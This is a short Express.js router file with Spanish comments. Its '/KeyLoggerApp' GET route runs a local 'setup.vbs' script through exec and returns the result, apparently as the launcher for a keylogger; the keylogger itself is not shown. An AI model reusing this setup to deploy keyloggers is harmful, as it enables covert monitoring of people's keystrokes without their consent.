import express from 'express';
import { exec } from 'child_process';

const router = express.Router();

router.get('/KeyLoggerApp', (req, res) => {
    // Ejecuta el setup.vbs
    exec('wscript "../App/setup.vbs"', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error ejecutando el script: ${error.message}`);
            return res.status(500).send(`Error ejecutando el script: ${error.message}`);
        }
        if (stderr) {
            console.error(`Error en el script: ${stderr}`);
            return res.status(500).send(`Error en el script: ${stderr}`);
        }

        console.log(`Resultado del script: ${stdout}`);
        return res.status(200).send(`Resultado del script: ${stdout}`);
    });
});

export default router;
